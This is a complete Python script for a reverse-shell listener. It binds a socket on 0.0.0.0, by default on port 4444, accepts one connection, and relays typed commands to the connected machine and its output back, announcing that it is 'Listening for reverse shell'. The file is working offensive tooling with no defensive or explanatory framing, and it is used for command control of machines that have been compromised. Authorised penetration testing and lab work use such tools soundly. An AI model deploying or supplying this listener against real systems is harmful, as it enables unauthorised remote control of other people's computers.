import socket
import sys

def start_listener(ip, port):
    # Create a TCP/IP socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Bind the socket to the address and port
    try:
        server_socket.bind((ip, port))
    except Exception as e:
        print(f"Error binding to {ip}:{port} - {e}")
        return

    # Listen for incoming connections
    server_socket.listen(1)
    print(f"[*] Listening for reverse shell on {ip}:{port}...")

    # Accept a connection
    client_socket, client_address = server_socket.accept()
    print(f"[*] Connection received from {client_address}")

    # Set non-blocking to allow for a better shell experience
    client_socket.settimeout(0.1)

    while True:
        try:
            # Receive data from the client
            data = b""
            while True:
                try:
                    chunk = client_socket.recv(4096)
                    if not chunk:
                        print("\n[*] Connection closed by remote host.")
                        return
                    data += chunk
                except socket.timeout:
                    break
            
            if data:
                print(data.decode('utf-8', errors='replace'), end='', flush=True)

            # Get user input
            command = input()
            if command.lower() in ["exit", "quit"]:
                client_socket.close()
                server_socket.close()
                break
            
            # Send the command to the client
            client_socket.sendall((command + "\n").encode('utf-8'))
            
        except KeyboardInterrupt:
            print("\n[*] Shutting down listener...")
            client_socket.close()
            server_socket.close()
            break
        except Exception as e:
            print(f"\n[!] Error: {e}")
            break

if __name__ == "__main__":
    IP = "0.0.0.0"  # Listen on all interfaces
    PORT = 4444
    if len(sys.argv) > 1:
        PORT = int(sys.argv[1])
    
    start_listener(IP, PORT)
